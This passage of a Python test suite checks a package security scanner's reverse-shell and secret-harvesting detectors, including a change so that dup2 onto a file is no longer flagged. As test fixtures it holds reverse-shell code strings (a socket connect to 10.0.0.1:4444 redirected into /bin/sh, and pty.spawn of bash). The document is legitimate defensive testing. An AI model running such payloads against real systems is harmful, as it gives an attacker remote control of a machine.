    guard reads sys.version_info, not the module table.

    The backport is supplied rather than required. The job that runs this suite installs
    pytest and PyYAML and nothing that provides `tomli` (it was `tests-security` in
    security-audit.yml, and is the `Security regression tests` step in
    workflow-trigger-lint.yml since that job was absorbed onto a shared runner). So a test
    that leaned on a real `tomli` being importable would
    `importorskip` its way to green there and never once execute the branch it exists to
    cover. Registering the stdlib parser under the name the fallback looks for keeps this
    load-bearing on every interpreter and in CI, while still proving the fallback is what
    gets consulted, because `import tomllib` is made to fail for the duration.
    """
    import builtins
    import importlib

    # Read the REAL version before it is patched, and take whichever parser this interpreter genuinely has.
    # On 3.11+ that is stdlib tomllib, which is always there, so the branch runs in CI;
    # on a real 3.9/3.10 it is the tomli the requirements already pin, and only a machine missing both ever skips.
    parser = (
        importlib.import_module("tomllib")
        if sys.version_info >= (3, 11)
        else pytest.importorskip("tomli")
    )
    monkeypatch.setattr(sys, "version_info", (3, 10, 0, "final", 0))
    monkeypatch.setitem(sys.modules, "tomli", parser)
    real_import = builtins.__import__

    def without_tomllib(name, *args, **kwargs):
        if name == "tomllib":
            raise ModuleNotFoundError("No module named 'tomllib'", name = "tomllib")
        return real_import(name, *args, **kwargs)

    monkeypatch.setattr(builtins, "__import__", without_tomllib)

    assert _supported_python_versions(REPO_ROOT)[0] == "3.9"
    assert any(source == "pyproject.toml" for source, _ in _audited_requirements(REPO_ROOT))


# ──────────────────────────────────────────────────────────────────────
# dup2 needs a socket to mean "reverse shell"


def _reverse_shell_findings(source: str):
    return [
        f
        for f in sp.check_py_file(source, "pkg/module.py", "pkg")
        if f.check == "Reverse shell / bind shell pattern"
    ]


@pytest.mark.parametrize(
    "source",
    [
        # triton 3.8.0's _internal_testing.py, the shape that reddened main.
        "import os, tempfile\n"
        "def capture():\n"
        "    tmp = tempfile.TemporaryFile()\n"
        "    saved = os.dup(2)\n"
        "    os.dup2(tmp.fileno(), 2)\n"
        "    os.dup2(saved, 2)\n",
        # torch's elastic redirect plumbing: dup2 and nothing else at all.
        "import os\ndef redirect(to_fd, from_fd):\n    os.dup2(to_fd, from_fd)\n",
    ],
)
def test_dup2_without_a_socket_is_not_a_reverse_shell(source):
    """Pointing a descriptor at a FILE is ordinary, and used to be CRITICAL.

    Ten of the nineteen reverse-shell entries in the committed baseline are this
    shape and not one is a true positive, so the finding cost review time and
    reopened whenever an unrelated release touched the file.
    """
    assert _reverse_shell_findings(source) == []


def test_dup2_onto_a_socket_is_still_a_reverse_shell():
    source = (
        "import os, socket, subprocess\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        's.connect(("10.0.0.1", 4444))\n'
        "os.dup2(s.fileno(), 0)\n"
        "os.dup2(s.fileno(), 1)\n"
        'subprocess.call(["/bin/sh"])\n'
    )
    found = _reverse_shell_findings(source)
    assert len(found) == 1 and found[0].severity == sp.CRITICAL
    assert "dup2" in found[0].evidence and "socket" in found[0].evidence


def test_socketless_payloads_still_fire():
    """The alternatives that never depended on dup2 are untouched."""
    assert _reverse_shell_findings('import pty\npty.spawn("/bin/bash")\n')
    assert _reverse_shell_findings(
        "import socket, subprocess\n"
        "s = socket.socket()\n"
        's.connect(("evil", 1))\n'
        'subprocess.call("/bin/sh")\n'
    )


def test_committed_baseline_covers_the_zoo_url_guard():
    """unsloth-zoo's SSRF guard reads one env var and holds a blocklist of
    metadata hostnames, next to the requests session it exists to police, so it
    trips two combination checks. Reviewed as benign and allowlisted; without
    these entries every Security audit run on main is red.
    """
    path = REPO_ROOT / "scripts" / "scan_packages_baseline.json"
    entries = json.loads(path.read_text(encoding = "utf-8"))["entries"]
    checks = {
        e["check"]
        for e in entries
        if e["package"].replace("_", "-") == "unsloth-zoo"
        and e["file"] == "unsloth_zoo/vision_utils.py"
    }
    assert "Harvests environment variables/secrets AND makes network calls" in checks
    assert "Accesses cloud metadata/IMDS AND makes network calls" in checks


def test_a_named_reverse_shell_keeps_its_original_evidence():
    """A file that fires on a named alternative must not have its evidence grown.

    The evidence is what evidence_hash is taken over, so widening it reopens
    every reviewed baseline entry for that file. multiprocess/tests/__init__.py
    holds a socket, a connect, a subprocess AND a dup2, and appending the dup2
    pairing to its evidence turned two allowlisted findings back into CRITICALs
    and reddened the hf-stack and studio shards.
    """
    source = (
        "import os, socket, subprocess\n"
        "def helper():\n"
        "    s = socket.socket()\n"
        '    s.connect(("h", 1))\n'
        '    subprocess.call("/bin/sh")\n'
        "def redirect(fd):\n"
        "    os.dup2(fd, 1)\n"
    )
    found = _reverse_shell_findings(source)
    assert len(found) == 1
    code_only = sp._strip_noncode(source)
    assert found[0].evidence == sp._extract_evidence(
        code_only, sp.RE_REVERSE_SHELL
    ), "evidence for a named alternative must be exactly what it always was"
    assert "Dup:" not in found[0].evidence, "the gate must not author its own evidence"


def test_the_evidence_pattern_is_never_narrowed():
    """RE_REVERSE_SHELL must keep every branch, dup2 included.

    It is re.DOTALL, so a match runs from the first signal to the last and a long
    span renders as a digest of the whole thing. Dropping a branch moves the span,
    moves the digest, and silently reopens every reviewed baseline entry taken
    against it: doing exactly that un-suppressed 11 entries across the studio and
    hf-stack shards. Whether dup2 alone is enough is decided in check_py_file.
    """
    assert sp.RE_REVERSE_SHELL.search("os.dup2(fd, 1)"), (
        "the evidence pattern must still match dup2, or every baselined "
        "reverse-shell entry containing one is re-rendered"
    )
    assert not sp.RE_REVERSE_SHELL_WITHOUT_DUP.search("os.dup2(fd, 1)")
    for probe in ('pty.spawn("/bin/sh")', 'webbrowser.open("data:x")'):
        assert bool(sp.RE_REVERSE_SHELL.search(probe)) == bool(
            sp.RE_REVERSE_SHELL_WITHOUT_DUP.search(probe)
        ), probe


def test_a_socketed_file_renders_what_it_always_rendered():
    """The gate must not touch evidence for anything that still fires."""
    source = (
        "import os, socket, subprocess\n"
        "def go():\n"
        "    s = socket.socket()\n"
        '    s.connect(("h", 1))\n'
        "    os.dup2(s.fileno(), 0)\n"
        '    subprocess.call("/bin/sh")\n'
    )
    found = _reverse_shell_findings(source)
    assert len(found) == 1
    code_only = sp._strip_noncode(source)
    assert found[0].evidence == sp._extract_evidence(code_only, sp.RE_REVERSE_SHELL)
